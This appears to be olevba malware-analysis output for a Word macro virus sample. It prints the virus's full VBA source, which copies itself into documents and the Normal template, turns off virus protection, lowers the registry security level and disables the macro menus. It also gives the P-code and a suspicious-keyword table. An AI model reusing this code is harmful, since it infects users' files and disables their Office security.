olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Onex.h
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Extra.cls 
in file: Virus.MSWord.Onex.h - OLE stream: 'Macros/VBA/Extra'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
 On Error Resume Next
  MsgBox "Íà äèñê íàòÿíóòà çàùèòà îò çàïèñè."
  MsgBox "Òû ñäåëàë ÷òî-òî, ÷åãî ìû íå îæèäàëè. ×åì áû ýòî íè áûëî, äåëàòü ýòîãî íå ñòîèëî. Ïîïðîáóé äðóãîé ïîäõîä. "
 Set c = New DataObject
  If ActiveDocument.VBProject.VBComponents(1).Name <> "Extra" Then
    Set go = ActiveDocument.VBProject.VBComponents(1)
    saveit = True
   ElseIf NormalTemplate.VBProject.VBComponents(1).Name <> "Extra" Then
    Set go = NormalTemplate.VBProject.VBComponents(1)
  End If
  With go
   c.SetText Extra.VBProject.VBComponents(1).CodeModule.lines(1, Extra.VBProject.VBComponents(1).CodeModule.countoflines)
   .CodeModule.deletelines 1, .CodeModule.countoflines
   .CodeModule.insertlines 1, c.GetText
   .Name = "Extra"
  End With
 Options.ConfirmConversions = 0
 Options.SaveNormalPrompt = 0
 Options.VirusProtection = 0
  If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
     CommandBars("Macro").Controls("Security...").Enabled = 0
     System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
  End If
 CommandBars("Tools").Controls("Macro").Enabled = 0
  If saveit = True Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 End Sub
' mY FIRST VIRUS ! bY 4B4C4F50
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Onex.h
' ===============================================================================
' Module streams:
' Macros/VBA/Extra - 3044 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitStr 0x0022 "Íà äèñê íàòÿíóòà çàùèòà îò çàïèñè."
' 	ArgsCall MsgBox 0x0001 
' Line #3:
' 	LitStr 0x006A "Òû ñäåëàë ÷òî-òî, ÷åãî ìû íå îæèäàëè. ×åì áû ýòî íè áûëî, äåëàòü ýòîãî íå ñòîèëî. Ïîïðîáóé äðóãîé ïîäõîä. "
' 	ArgsCall MsgBox 0x0001 
' Line #4:
' 	SetStmt 
' 	New <crash>
' 	Set c 
' Line #5:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Extra"
' 	Ne 
' 	IfBlock 
' Line #6:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set GoSub 
' Line #7:
' 	LitVarSpecial (True)
' 	St saveit 
' Line #8:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Extra"
' 	Ne 
' 	ElseIfBlock 
' Line #9:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set GoSub 
' Line #10:
' 	EndIfBlock 
' Line #11:
' 	StartWithExpr 
' 	Ld GoSub 
' 	With 
' Line #12:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld Extra 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	LitDI2 0x0001 
' 	Ld Extra 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	Ld c 
' 	ArgsMemCall SetText 0x0001 
' Line #13:
' 	LitDI2 0x0001 
' 	MemLdWith CodeModule 
' 	MemLd countoflines 
' 	MemLdWith CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #14:
' 	LitDI2 0x0001 
' 	Ld c 
' 	MemLd GetText 
' 	MemLdWith CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #15:
' 	LitStr 0x0005 "Extra"
' 	MemStWith New 
' Line #16:
' 	EndWith 
' Line #17:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #18:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #19:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #20:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #21:
' 	LitDI2 0x0000 
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #22:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	LitDI2 0x0000 
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #25:
' 	Ld saveit 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #26:
' 	EndSub 
' Line #27:
' 	QuoteRem 0x0000 0x001D " mY FIRST VIRUS ! bY 4B4C4F50"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Hex String|KLOP                |4B4C4F50                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

